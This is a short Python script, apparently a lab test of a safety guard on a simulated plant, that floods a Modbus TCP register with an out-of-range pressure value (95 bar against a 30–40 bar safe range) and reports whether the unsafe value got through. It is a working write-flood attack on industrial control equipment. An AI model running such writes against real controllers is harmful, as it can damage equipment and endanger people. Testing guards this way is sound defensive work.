from pymodbus.client import ModbusTcpClient
import time
import sys

HOST = "192.168.2.139"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5020

# Safe range for pressure, in tenths of a bar (matches guard.py / plant.py)
PRESSURE_SAFE = (300, 400)

print(f"--- ATTACK HOLD: targeting port {PORT} ---")
client = ModbusTcpClient(HOST, port=PORT)
client.connect()

readings = []          # (elapsed_seconds, actual_value)
attack_value = 950     # 95.0 bar — well outside safe range
writes_sent = 0

start = time.time()
deadline = start + 8

while time.time() < deadline:
    client.write_register(1, attack_value, slave=1)
    writes_sent += 1
    # Read back immediately — this is the actual live register state
    # right after the write, before any self-heal tick can smooth it over.
    r = client.read_holding_registers(1, 1, slave=1)
    if not r.isError():
        elapsed = time.time() - start
        readings.append((elapsed, r.registers[0]))
    time.sleep(0.1)   # poll fast — plant's own tick loop runs every 1s

client.close()

# --- Analysis ---
peak = max(readings, key=lambda x: x[1]) if readings else (0, 0)
unsafe_readings = [v for _, v in readings if not (PRESSURE_SAFE[0] <= v <= PRESSURE_SAFE[1])]
unsafe_fraction = len(unsafe_readings) / len(readings) if readings else 0

print(f"Writes sent: {writes_sent}")
print(f"Peak pressure observed: {peak[1]/10:.1f} bar at t={peak[0]:.2f}s "
      f"(safe range: {PRESSURE_SAFE[0]/10:.1f}-{PRESSURE_SAFE[1]/10:.1f} bar)")
print(f"Readings outside safe range: {len(unsafe_readings)}/{len(readings)} "
      f"({unsafe_fraction*100:.0f}%)")
if peak[1] > PRESSURE_SAFE[1]:
    print("RESULT: UNSAFE VALUE REACHED THE PLANT")
else:
    print("RESULT: value never left safe range — attack fully contained")
